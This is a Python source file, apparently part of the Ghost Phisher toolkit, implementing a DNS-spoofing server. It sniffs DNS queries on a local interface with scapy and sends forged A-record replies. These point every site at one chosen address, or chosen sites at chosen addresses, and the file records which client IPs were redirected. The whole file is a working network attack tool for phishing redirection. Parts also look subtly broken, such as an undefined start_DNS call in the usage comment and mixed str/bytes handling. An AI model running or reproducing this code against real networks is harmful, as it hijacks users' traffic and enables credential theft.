#-------------------------------------------------------------------------------
# Name:        Ghost DNS Server
# Purpose:     FAST Multiplatform RFC 1035 DNS Server API
#
# Author:      Saviour Emmanuel Ekiko
#
# Created:     5/05/2012
# Copyright:   (c) Ghost Phisher 2011
# Licence:     <GNU GPL v3>
#
#
#-------------------------------------------------------------------------------
# GNU GPL v3 Licence Summary:
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

import re
import os
import socket
import _thread

from scapy.all import *
from PyQt6 import QtCore


class Ghost_DNS_Server(QtCore.QThread):
    new_client_connection = QtCore.pyqtSignal()
    
    def __init__(self, parent=None):
        super().__init__(parent)
        self.interface = str()              # eth0
        self.single = str()                 # 192.168.0.1 -> Will return single address to all queries
        self.mapping = {}                   # Will return a specific website with a specific Address {'www.google.com','192.168.0.1'}
        self._dns_mode = str()              # Modes = (MAPPING | SINGLE)
        self._src_mac = str()               # src = 00:0c:29:07:b7:b1
        self._src_ip = str()                # 192.168.0.10
        self._dst_mac = str()               # dst = 00:0c:29:3f:10:5b
        self._dst_ip = str()                # 192.168.0.1
        self._dst_port = str()
        self._transaction_id = int()
        self._query_string = str()
        self.connection = int()             # Count number of connections

        self.control_dns = False
        self.inform = []                    # ['192.168.0.3','www.google.com']

        self.sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)     # Socket response


    def DNS_A_Record(self,target_address):
        Ethernet_packet = Ether(dst=self._src_mac, src=self._dst_mac, type=0x800)
        IP_packet = IP(proto='udp',src=self._dst_ip, dst=self._src_ip, options='')
        UDP_packet = UDP( sport='domain', dport=self._dst_port)
        DNS_packet = DNS(id=self._transaction_id, qr=1, opcode='QUERY', aa=1, tc=0, rd=1, ra=1, z=0,
        rcode=0, qdcount=1, ancount=1, nscount=0, arcount=0, qd=DNSQR(qname=self._query_string,
        qtype='A', qclass='IN'), an=DNSRR(rrname=self._query_string, type='A', rclass='IN', ttl=3600,
        rdata=target_address),ns='None', ar='None')
        packet = Ethernet_packet/IP_packet/UDP_packet/DNS_packet
        return(packet)


    def process_Query(self,raw_packet):
        packet = str()
        if(raw_packet.haslayer(DNSQR) and raw_packet.haslayer(UDP)):
            if(raw_packet.getlayer(UDP).dport == 53):
                mac_info = raw_packet.getlayer(Ether)
                address_info = raw_packet.getlayer(IP)
                dst_port = raw_packet.getlayer(UDP)
                transaction = raw_packet.getlayer(DNS)
                self._src_mac = mac_info.src
                self._dst_mac = mac_info.dst
                self._src_ip = address_info.src
                self._dst_ip = address_info.dst
                self._dst_port = dst_port.sport
                self._transaction_id = transaction.id

                dns_query = raw_packet.getlayer(DNSQR)
                self._query_string = dns_query.qname

                if('in-addr.arpa' in self._query_string):
                    packet = self.DNS_A_Record(self._src_ip)

                elif(self._dns_mode == "SINGLE"):
                    packet = self.DNS_A_Record(self.single)
                    self.inform = [self._src_ip,str()]
                    self.new_client_connection.emit()
                else:
                    web_string = re.findall(r"\.(\S*)\.",self._query_string)[0]
                    for address in list(self.mapping.keys()):
                        if(web_string in address):
                            IP_address = self.mapping[address]
                            packet = self.DNS_A_Record(IP_address)
                            self.inform = [self._src_ip,address]
                            self.new_client_connection.emit()
                            break

                self.connection += 1
                if(packet == str()):
                    return
                if(self.control_dns):
                    sendp(packet,iface = self.interface)


    def _socket_responder(self):
        self.sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)     # Socket response
        self.sock.bind(("",53))
        while(self.control_dns):
            self.sock.recvfrom(1024)
        self.sock.close()



    def filter_packet(self):
        _thread.start_new_thread(self._socket_responder,())
        sniff(iface = self.interface,prn = self.process_Query,count = 0)



    def set_DNS_Mode(self,mode):
        options = ['MAPPING','SINGLE']
        if(mode not in options):
            raise Exception("Invalid DNS Mode Selected")
        self._dns_mode = mode


    def run(self):
        self.connection = int()
        self.control_dns = True
        self.inform = []

        self.filter_packet()


    def stop_DNS(self):
        self.control_dns = False
        sock_close = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        sock_close.connect(("127.0.0.1",53))
        sock_close.sendall("Shutdown Now")
        self.sock.close()



# USAGE

# dns_instance = Ghost_DNS_Server()
# dns_instance.interface = "eth0"
# dns_instance.single = "192.168.0.3"
# dns_instance.start_DNS()







